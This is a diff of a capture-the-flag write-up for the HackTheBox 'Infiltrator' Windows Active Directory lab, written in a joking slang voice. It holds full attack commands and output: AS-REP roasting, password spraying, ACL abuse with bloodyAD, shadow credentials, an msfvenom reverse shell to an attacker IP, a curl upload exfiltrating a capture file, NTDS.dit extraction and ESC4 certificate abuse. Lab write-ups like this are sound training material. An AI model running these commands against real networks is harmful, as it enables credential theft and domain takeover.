@@ -1,7 +1,7 @@
 ---
 title:  "Infiltrator (Insane)"
 seo_title: "Writeup for the HackTheBox Infiltrator Machine"
-date:   2025-08-02T21:01
+date:   2025-08-01T21:01
 categories: ['HackTheBox', 'Windows', 'Active-Directory']
 ---
 
@@ -11,9 +11,7 @@ categories: ['HackTheBox', 'Windows', 'Active-Directory']
 Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn't have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application's API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator's hash and compromise the whole domain through the certificate exploitation.
 
 ## Enumeration
-I ain’t wastin' time with your granddaddy’s nmap scan — nah, we already know this box be bustin’ that Active Directory life, so we skip the foreplay and go raw into **user enumeration**.
-
-First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin').
+I ain’t wastin' time with your granddaddy’s nmap scan — nah, we already know this box be bustin’ that Active Directory life, so we skip the foreplay and go raw into **user enumeration**. First, we rip a list of names straight off the company site like it’s LinkedIn recon but with zero professionalism and maximum goblin energy (we be lootin').
 
 ```
 David Anderson
@@ -55,7 +53,7 @@ Version: v1.0.3 (9dad6e1) - 09/01/24 - Ronnie Flathers @ropnop
 2024/09/01 09:45:33 >  [+] VALID USERNAME:	 l.clark@INFILTRATOR.HTB
 ```
 
-Alright, we cracked the username code, and yeah, we could spam it with name lists like a desperate Tinder bot, but tossing in `j.smith-x98800.txt` was a total flop, dry as the Sahara. So, we’re calling it: this is our final crew.
+Alright, we cracked the username code, and yeah, we could spam it with name lists like a desperate Tinder bot, but tossing in `j.smith-x98800.txt` was a total flop. So, we’re calling it: this is our final crew.
 
 ```
 administrator@INFILTRATOR.HTB
@@ -68,7 +66,7 @@ e.rodriguez@INFILTRATOR.HTB
 l.clark@INFILTRATOR.HTB
 ```
 
-Time to get greasy with **ASREPRoasting**. We send a lil’ love letter to the domain like “hey, gimme them sweet sweet hashies” — and boom, one account responds like “sure babe, no pre-auth needed!”. Yes my dude!
+Time to get greasy with **ASREPRoasting**. We send a lil’ love letter to the domain like “hey, gimme them sweet sweet hashies” — and boom, one account responds like “sure babe, no pre-auth needed!”. Yessir!
 
 ```console
 $ GetNPUsers.py INFILTRATOR.HTB/ -dc-ip 10.10.11.31 -no-pass -usersfile all_ad_users -format hashcat
@@ -129,6 +127,13 @@ So we take this blessed gift from k.turner’s description field and we **yeet**
 
 > _“You get a login! YOU get a login! ERRBODY LOGGING IN!”_
 
+```console
+$ nxc smb dc01.infiltrator.htb -u users.txt -p 'MessengerApp@Pass!' --continue-on-success
+SMB         10.10.11.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.31   445    DC01             [-] infiltrator.htb\k.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE
+SMB         10.10.11.31   445    DC01             [-] infiltrator.htb\d.anderson:MessengerApp@Pass! STATUS_LOGON_FAILURE
+```
+
 But then... Curveball. We see that both `m.harris` and `d.anderson` get the message `STATUS_ACCOUNT_RESTRICTION`. Excuse me??? Microsoft really out here like:
 
 > “Woah woah woah, hold up... you _do_ have the right password, but uhh... no entry. Try again when your chakras are aligned or whatever.” 
@@ -137,7 +142,7 @@ This ain't a wrong password, nah. This is **“you got it, but you still ain't a
 
 So yeah — creds probably valid, but maybe they’re disabled, locked out, got logon restrictions, or just spiritually unavailable. Either way, these accounts are on some ✨emotional boundary✨ arc and we gotta pivot.
 
-## Bloodhound
+### Bloodhound
 So now that we got creds for `l.clark` (shoutout to my boy k.turner), we unleash **BloodHound** to sniff out the domain like a digital truffle pig.
 
 ```console
@@ -162,9 +167,7 @@ And BOOM — it worked. Password valid. Ticket secured. Identity stolen. Heist s
 $ nxc smb infiltrator.htb -d infiltrator.htb -u 'd.anderson' -p 'WAT?watismypass!' -k
 ```
 
-But hold up... BloodHound whispers in our ear again:
-
-> **“psst... `d.anderson` got `GenericAll` over the Marketing Digital OU...”**
+But hold up... BloodHound whispers in our ear again: **“psst... `d.anderson` got `GenericAll` over the Marketing Digital OU...”**
 
 ![](/assets/images/writeups/infiltrator/BH-Anderson.png)
 
@@ -179,8 +182,7 @@ $ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k add genericAll 'OU=
 [+] l.clark has now GenericAll on OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB
 ```
 
-That’s it. **l.clark just went from running marketing reports to rewriting destiny.**  
-Let the ACL shenanigans commence.
+That’s it, **l.clark just went from running marketing reports to rewriting destiny.** Let the ACL shenanigans commence.
 
 ## User
 Now that we’ve yeeted `GenericAll` onto the OU like it’s a cursed enchantment, our permissions have **trickled down** to lil’ `e.rodriguez` too. BloodHound’s over here grinning like:
@@ -191,8 +193,6 @@ Now that we’ve yeeted `GenericAll` onto the OU like it’s a cursed enchantmen
 
 So how do we get spicy with this? We’re about to hit `e.rodriguez` with **Shadow Credentials**—basically stuffing a fake cert into his account like it’s a USB Rubber Ducky in a coffee shop laptop.
 
-This lets us **Pass the Certificate** using PKINIT, snag a TGT, and suddenly we’re `e.rodriguez` now. It’s like Face/Off but for Active Directory. Kerberos never saw it coming.
-
 ```console
 $ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' add shadowCredentials 'e.rodriguez'
 [+] KeyCredential generated with following sha256 of RSA key: 21db2d646e4fd3177d1c18717161109ed382cae2e6ed5529cf1589e41a38ad3c
@@ -202,7 +202,11 @@ No outfile path was provided. The certificate(s) will be stored with the filenam
 A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 Run the following command to obtain a TGT:
 python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
+```
 
+This lets us **Pass the Certificate** using PKINIT, snag a TGT, and suddenly we’re `e.rodriguez` now. It’s like Face/Off but for Active Directory. Kerberos never saw it coming.
+
+```console
 $ python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
 2024-09-01 12:36:01,801 minikerberos INFO     Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
@@ -250,7 +254,13 @@ While we’re at it, we’re gonna _force_ poor `m.harris` to change their passw
 #       kdc = CONSOLE
 ```
 
-We add ourself to the target group and force a password change.
+If you are not a scrub like me, you could have just generated this with `nxc`.
+
+```console
+$ nxc smb infiltrator.htb --generate-krb5-file krb5.conf
+```
+
+Now we add ourself to the target group and force a password change.
 
 ```console
 $ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u "e.rodriguez" -p ':b02e97f2fdb5c3d36f77375383449e56' add groupMember 'CHIEFS MARKETING' 'e.rodriguez'
@@ -259,7 +269,7 @@ $ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u "e.rodriguez" -p ':b02e97f2f
 $ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u "e.rodriguez" -p ':b02e97f2fdb5c3d36f77375383449e56' set password 'm.harris' 'Pwn3d_by_ACLs!'
 ```
 
-Since `m.harris` is playing the _protected user_ card like the VIP of Active Directory, we gotta do the whole “request a TGT and flex Kerberos auth” dance again.  
+Since `m.harris` is playing the _protected user_ card like he the president of Active Directory, we gotta do the whole “request a TGT and flex Kerberos auth” dance again.  
 
 No password? No problem — just slide into Evil-WinRM using the magic `--realm` flag with your shiny ticket instead of a boring old password. It’s like showing up to the party with a golden invite while everyone else is stuck outside sweating their creds.
 
@@ -294,7 +304,7 @@ MySQL_data=data
 Backup=backup
 ```
 
-## Unintended Path
+### Unintended Path
 Since the database is running with admin powers like it’s the kingpin of this system, we just casually port-forward that juicy MySQL on port 14406 and grab the root flag like a boss.  
 Dropped Chisel on the target because who doesn’t love a good reverse tunnel flex?
 
@@ -309,7 +319,7 @@ MariaDB [outputwall]> select LOAD_FILE("C:/Users/Administrator/Desktop/root.txt"
 
 Easy mode activated — root flag, served on a silver platter. Now buckle up, because it’s time to dive into the _actual_ intended way to get root. Spoiler: it’s not this chill.
 
-## Intended Path (Windows Client needed)
+### Intended Path (Windows Client needed)
 From here on out, we’re hopping into a Windows VM because… well, reasons. Spoiler alert: it gets messy and way more fun. If you still have the TGT ticket for `m.harris` chilling somewhere, just yank it over and convert to a Kirbi file like a pro hacker. But nah, I’m gonna show you how to climb back up from `e.rodriguez` to `m.harris` — Windows style.
 
 !!!warning
@@ -329,8 +339,7 @@ PS C:\> python C:\Tools\Python\getTGT.py 'infiltrator.htb/m.harris:Pwn3d_by_ACLs
 [*] Saving ticket in m.harris.ccache
 ```
 
-Next up, before Kerberos can party on our Windows attack VM, we gotta join it to the domain.  Hop into: `Settings > Accounts > Access work or school > Connect`  
-Punch in `infiltrator.htb` as the domain and log in with any domain account (e.g. `l.clark`).
+Next up, before Kerberos can party on our Windows attack VM, we gotta join it to the domain.  Hop into: `Settings > Accounts > Access work or school > Connect`. Punch in `infiltrator.htb` as the domain and log in with any domain account (e.g. `l.clark`).
 
 Another pro tip: Make sure your VPN interface’s DHCP server points to the DC IP (10.10.11.31), otherwise Kerberos throws a hissy fit. 
 
@@ -340,7 +349,7 @@ If it asks to add an account, just politely decline. Restart your VM, sign in as
 
 Next we can convert the `ccache` file to Kirbi and inject our ticket into memory using Rubeus.
 
-```console
+```powershell
 PS C:\> python C:\Tools\Python\ticketConverter.py .\m.harris.ccache m.harris.kirbi
 [*] converting ccache to kirbi...
 [+] done
@@ -350,7 +359,7 @@ PS C:\> C:\Tools\Rubeus.exe ptt /ticket:m.harris.kirbi
 
 Aight we’re in. Since `m.harris` got that sweet Remote Management privilege, we Kerberos-yeet ourselves into a WinRM shell like some kind of enterprise wizard. Once inside, it’s business as usual: HTTP server up, chisel in hand, and we're tunneling like it’s 1999.
 
-```console
+```powershell
 PS C:\> python -m http.server
 PS C:\> winrm set winrm/config/client '@{TrustedHosts="*"}'
 PS C:\> Enter-PSSession -ComputerName dc01.infiltrator.htb -Authentication Kerberos
@@ -359,12 +368,12 @@ PS C:\> Enter-PSSession -ComputerName dc01.infiltrator.htb -Authentication Kerbe
 
 Drop the chisel. Tunnel the ports. Talk to the DB like a boss.
 
-```console
+```powershell
 PS C:\> C:\Tools\chisel.exe server --reverse
 [dc01.infiltrator.htb]: PS C:\Windows\Temp> .\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14406
 ```
 
-Inside the `ot_wall_posts` table, we uncover some juicy lore straight from the dev diaries:
+Inside the `ot_wall_posts`, we uncover some juicy lore straight from the dev diaries:
 
 ```
 Hey team, I\'m here! In this screenshot, I\'ll guide you through using the app UserExplorer.exe. It works seamlessly with dev credentials, but remember, it\'s versatile and functions with any credentials. Currently, we\'re exploring the default option. Stay tuned for more updates!\n\n\"UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris
@@ -372,9 +381,12 @@ Hey team, I\'m here! In this screenshot, I\'ll guide you through using the app U
 Hey team,\n\nWe\'ve identified a security concern: some users and our domain (dc01.infiltrator.htb) have pre-authentication disabled on kerberos. \nNo need to panic! Our vigilant team is already on it and will work diligently to fix this. In the meantime, stay vigilant and be cautious about any potential security risks
 ```
 
+![](/assets/images/writeups/infiltrator/OM-OT-wall.png)
+
+
 Thanks for the creds, mystery dev. Now, according to OutputMessenger’s official docs (yes, we actually read those), the app needs a buffet of ports open to do its thing. Let’s open the floodgates:
 
-```console
+```powershell
 PS C:\> Invoke-Command -ScriptBlock { C:\Windows\Temp\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 } -Session $Session
 
 2024/09/06 07:22:02 client: Connected (Latency 523.4µs)
@@ -387,12 +399,11 @@ Hello everyone 😃
 There have been some complaints regarding the stability of the "Output Messenger" application. In case you encounter any issues, please make sure you are using a Windows client. The Linux version is outdated.
 ```
 
-Translation:
-> “Linux users? Sorry babes, go get a real OS.”
+Translation: “Linux users? Sorry babes, go get a real OS.”
 
 So yeah, looks like we’re installing the Windows client if we want this app to actually function. Time to bootleg some enterprise nostalgia.
 
-### OutputMessenger Windows Client
+#### OutputMessenger Windows Client
 So we spin up the Windows OutputMessenger client (don’t ask how we still trust this thing), login as our dev-king `m.harris` using the creds from the earlier DB leak: `D3v3l0p3r_Pass@1337!`
 
 ![](/assets/images/writeups/infiltrator/OM-login-win-client.png)
@@ -447,7 +458,7 @@ print(decrypt_string(key,decrypt_string(key, cipher_text)))
 
 We recover the password as `WinRm@$svc^!^P`. Now we can also WinRM with this user, which saves us some headaches of resetting passwords and grabbing TGTs.
 
-```console
+```powershell
 PS C:\> $SecPassword = ConvertTo-SecureString 'WinRm@$svc^!^P' -AsPlainText -Force
 PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('infiltrator.htb\winrm_svc', $SecPassword)
 PS C:\> Enter-PSSession -Computername 10.10.11.31 -Authentication Negotiate -Credential $Cred
@@ -473,8 +484,9 @@ Host: infiltrator.htb:14125
 
 Therefore we also need to forward port 14125 and send the following request.
 
-```console
-curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: infiltrator.htb:14125' http://localhost:14125/api/chatrooms/Chiefs_Marketing_chat
+```powershell
+PS C:\> curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: infiltrator.htb:14125' http://localhost:14125/api/chatrooms/Chiefs_Marketing_chat
+
 {"row":{"room":"Chiefs_Marketing_chat","roomusers":"A.walker|0,O.martinez|0"},"success":true}
 ```
  
@@ -484,8 +496,8 @@ Alright, we indeed see that Martinez is part of this chat room. In order to read
 
 Now we can attempt to read the logs by specifying a date range.
 
-```console
-curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: localhost:14125' 'http://localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2024/02/01&todate=2024/03/01'
+```powershell
+PS C:\> curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: localhost:14125' 'http://localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2024/02/01&todate=2024/03/01'
 ```
 
 At the bottom, we find the credentials for `o.martinez`.
@@ -500,15 +512,12 @@ Unfortunately, these are not domain credentials but we can still login to the OM
 I'm getting random website pop-ups on my desktop every day at 09:00 AM. I suspect there's an issue with the app
 ```
 
-So martinez been cryin in the club (OM chat) like
-> "wahh my desktop opening random websites at 9AM 😭"
-
-Bro. you fr just told me you got **task scheduler malware edition** installed and running.
+So martinez been cryin in the club (OM chat) like "wahh my desktop opening random websites at 9AM 😭". Bro. you fr just told me you got **task scheduler malware edition** installed and running.
 
 From the application, there is a feature to run programs and open website on a designated time. When we try this out and for instance just launch the default browser application, it indeed opens on the local machine. Just a spicy lil feature called **"Scheduled Events"**, which basically goes:
 > “hey, wanna open calc.exe on ur coworker's PC at 3am? go for it.”
 
-I also noticed that Martinez always is in the idle state so maybe we can upload a reverse shell to the DC and execute it in the context of Martinez. Let's try!
+I also noticed that Martinez always is in the idle state so maybe we can upload a reverse shell to the DC and execute it in the context of Martinez. Let's try! Metasploit payload goes brrr...
 
 ```console
 $ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f exe -o payload.exe
@@ -518,19 +527,17 @@ $ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f exe -o
 PS C:\> C:\Tools\nc64.exe -nlvp 443
 ```
 
-Payload.exe goes brrr. Now I create a new event with a nearby time, logout and login as `k.turner` with pass `MessengerApp@Pass!` and wait. You also need to have the same binary in your local machine in order to create the event. Just make sure martinez stays online. If not? Cry harder, reset the box, and try again. Cuz when that scheduled payload hits, you're not just in the room… **you’re in his session.**
+Now I create a new event with a nearby time, logout and login as `k.turner` with pass `MessengerApp@Pass!` and wait. You also need to have the same binary in your local machine in order to create the event. Just make sure martinez stays online. If not? Cry harder, reset the box, and try again. Eventually you will get a shell bro.
 
 !!!info
 At this point you can switch back to a Linux VM or continue on Windows if you prefer ;)
 !!!
 
-### PCAP Analysis and BitLocker Decrypt
-So we pokin’ around in Martinez’s AppData, and guess what man’s got tucked away in the digital sock drawer? A juicy lil `.pcapng` file sittin’ there like it didn’t just witness a whole cybercrime. File’s named `network_capture_2024.pcapng`—real subtle.
+#### PCAP Analysis and BitLocker Decrypt
+So we pokin’ around in Martinez’s AppData, and guess what man’s got tucked away in the digital sock drawer? A juicy lil `.pcapng` file sittin’ there like it didn’t just witness a whole cybercrime. File’s named `network_capture_2024.pcapng`—real subtle. Naturally, we snatch it. Set up a quick n’ dirty Python upload server on our end, then slap that file across the internet like we’re trading bootleg mixtapes.
 
-Naturally, we snatch it. Set up a quick n’ dirty Python upload server on our end, then slap that file across the internet like we’re trading bootleg mixtapes.
-
-```
-python -m uploadserver
+```console
+$ python -m uploadserver
 PS C:\Users\O.martinez\AppData> curl.exe http://10.10.14.7:8000/upload -F "files=@network_capture_2024.pcapng" -f "token=helloworld"
 ```
 
@@ -538,14 +545,11 @@ Now inside the capture, we dig up two little digital treasures:
 1. A sketchy-looking file labeled `BitLocker-backup.7z` (because encrypting your own encryption is totally normal, right?)
 2. A cleartext password floating inside an API call: `M@rtinez_P@ssw0rd!` dropped casually in a `change_auth_token` request. Like bro, you good?
 
-Armed with the creds, we RDP into Martinez’s box. Like legally? No. But efficiently? Absolutely.
+Armed with the creds, we RDP into Martinez’s box. Like legally? No. But efficiently? Absolutely. Anyway, this zip file’s got a password on it. Of course it does. But we ain’t scared of some password-protected nonsense. We hit it with that `zip2john` → `hashcat` combo and let RockYou do what RockYou does best.
 
-Anyway, this zip file’s got a password on it. Of course it does. But we ain’t scared of some password-protected nonsense. We hit it with that `zip2john` → `hashcat` combo and let RockYou do what RockYou does best.
-
-```
-zip2john BitLocker-backup.7z
-
-hashcat bitlocker.hash $ROCKYOU
+```console
+$ zip2john BitLocker-backup.7z > bitlocker.hash
+$ hashcat bitlocker.hash $ROCKYOU
 ```
 
 Password? Man, it’s just `zipper`. Truly the creativity is off the charts. Inside? The BitLocker recovery key. That’s like finding the keys to someone’s panic room inside their junk drawer.
@@ -554,9 +558,7 @@ Password? Man, it’s just `zipper`. Truly the creativity is off the charts. Ins
 
 We use that shiny new key to unlock the drive like we’re defusing a bomb in a B-movie, and what do we find?
 
-Oh, just a full Windows Server 2012 backup sittin’ in the Documents folder of `Administrator`. You know, just casual enterprise-grade secrets lying around like loose change. And inside that backup? The crown jewel: `NTDS.dit` and the registry hives.
-
-Time to fire up `ntdsdotsqlite`, turn that chunky binary blob into an actual database we can poke at like the gremlins we are:
+Oh, just a full Windows Server 2012 backup sittin’ in the Documents folder of `Administrator`. You know, just casual enterprise-grade secrets lying around like loose change. And inside that backup? The crown jewel: `NTDS.dit` and the registry hives. Time to fire up `ntdsdotsqlite`, turn that chunky binary blob into an actual database we can poke at like the gremlins we are:
 
 ```console
 $ ntdsdotsqlite NTDS.DIT --system SYSTEM -o NTDS.sqlite
@@ -578,7 +580,7 @@ $ nxc smb 10.10.11.31 -u 'lan_managment' -p 'l@n_M@an!1331' -d infiltrator.htb
 SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331
 ```
 
-### Bloodhound LAN_MANAGMENT to INFILTRATOR_SVC
+#### Bloodhound LAN_MANAGMENT to INFILTRATOR_SVC
 So now that we deep in this bish, rootin' around like cyber raccoons, we stumble on a shiny lil gem: the gMSA password for `infiltrator_svc$`. Yeah, you heard me—**group managed service account** type beat. The kind of account that's like, “I rotate my password so you can’t get me,” but guess what? We got you, bozo.
 
 ![](/assets/images/writeups/infiltrator/BH-LAN.png)
@@ -602,7 +604,7 @@ One quick decrypt later and boom: password’s sittin’ in plaintext like it pa
 
 Let’s cook.
 
-### Certipy
+#### Certipy
 
 We back on the grind and it’s time to hunt some **ADCS** sauce. Fire up that **Certipy** like it’s a radar gun pointed straight at Microsoft’s feelings.
 
@@ -668,7 +670,7 @@ And just like that... We’re logged in as **Administrator**.
 $ psexec.py -hashes ':1356f502d2764368302ff0369b1121a1' administrator@10.10.11.31
 ```
 
-Box rooted. No password reset. No exploit chain. Just pure ACL wizardry and a cert with too much ambition. Time to stroll into `C:\Users\Administrator\Desktop`, pop open that `root.txt`, and whisper sweet nothings to the final flag.
+Box rooted. Just pure ACL wizardry and a cert with too much ambition. Time to stroll into `C:\Users\Administrator\Desktop`, pop open that `root.txt`, and whisper sweet nothings to the final flag.
 
 **GG. Game. Over**
 
